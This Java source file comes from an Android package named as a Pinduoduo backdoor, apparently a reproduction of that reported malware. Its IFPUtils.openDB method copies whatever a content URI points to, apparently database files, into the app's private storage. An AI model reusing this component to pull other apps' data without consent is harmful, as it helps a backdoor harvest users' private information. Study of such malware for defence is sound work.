package com.tech.pinduoduo_backdoor;

import android.net.Uri;
import android.util.Base64;

import java.io.FileOutputStream;
import java.io.InputStream;
import java.util.HashMap;
import java.util.UUID;

public class IFPUtils {
    private static IFPUtils iFPUtils;

    public static IFPUtils instance() {
        if (iFPUtils == null) {
            iFPUtils = new IFPUtils();
        }
        return iFPUtils;
    }

    private static String getFileName(Uri uri) {
        String encode;
        String path = uri.getPath();
        if (path == null) {
            return "";
        }
        String[] split = path.split("/");
        return (split.length == 0 || (encode = Base64.encodeToString(split[split.length - 1].getBytes(), Base64.NO_PADDING)) == null) ? "" : encode;
    }

    public String openDB(Uri uri) {
        try {
            Logger.debug("openDB uri " + uri);
            InputStream openInputStream = GlobalInfo.context.getContentResolver().openInputStream(uri);
            Logger.debug( "openInputStream: " + openInputStream);
            String basePath = GlobalInfo.context.getFilesDir().getAbsoluteFile().getPath();
            String filePath = basePath + "/" + UUID.randomUUID().toString() + "_" + getFileName(uri);
            Logger.debug("openDB tmp file path: " + filePath);
            FileOutputStream fileOutputStream = new FileOutputStream(filePath);
            byte[] bArr = new byte[67108864];
            int i = 0;
            while (true) {
                int read = openInputStream.read(bArr);
                if (read <= 0) {
                    break;
                }
                i += read;
                fileOutputStream.write(bArr, 0, read);
            }
            fileOutputStream.flush();
            fileOutputStream.close();

            openInputStream.close();

            return filePath;

        } catch (Exception e) {
            Logger.debug("openDB failed exception: " + e.getMessage());
            return null;
        }
    }
}
